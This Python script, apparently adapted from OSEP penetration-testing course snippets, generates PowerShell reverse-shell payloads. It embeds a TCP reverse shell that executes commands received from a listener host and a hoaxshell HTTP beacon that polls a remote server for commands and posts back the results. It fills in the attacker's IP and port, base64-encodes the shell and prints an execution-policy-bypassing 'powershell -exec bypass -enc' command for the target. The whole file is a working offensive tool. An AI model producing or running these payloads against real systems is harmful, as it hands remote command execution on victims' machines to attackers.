#!/usr/bin/python3

# Original script
# From https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter-msfvenom.py
# Basic shellcode crypter for C# payloads
# By Cas van Cooten

# jan-karel changes
# limited to csharp only
# default lport= 443
# writes out csharp project and build it

import os
import sys
import re
import base64
import platform
import argparse
import subprocess
from random import randint
from meuk.hacksec import *



template = ''

ps1 = '''$c = New-Object System.Net.Sockets.TCPClient('[ip]',[poort]);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $yolo = (iex $d 2>&1 | Out-String );
    $yolo = ([text.encoding]::ASCII).GetBytes($yolo + 'ps> ');
    $s.Write($yolo,0,$yolo.Length);
    $s.Flush()
};
$c.Close()
'''


#hoaxshell
ps2 = '''$s='[ip]';$i='*SESSIONID*';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/hartslag -Headers @{"*HOAXID*"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/opdrachten -Headers @{"*HOAXID*"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/resultaat -Method POST -Headers @{"*HOAXID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 11}

'''

ps3 = '''
'''


parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
parser.add_argument("File", help="the file to write the output to...", nargs='?', default="http/payloads/shell_433.txt")
args = parser.parse_args()


# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating PowerShell payloads for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} with LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")

ps1 = ps1.replace('[ip]', args.lhost).replace('[poort]', args.lport)

print(ps1)
byte = ps1.encode('utf-16-le')
b64 = base64.b64encode(byte)

# Print out the PowerShell command that should be run on the target machine
# -exec bypass allows the execution policy to be bypassed
# -enc indicates that the following script is base64-encoded
print("powershell -exec bypass -enc %s" % b64.decode())








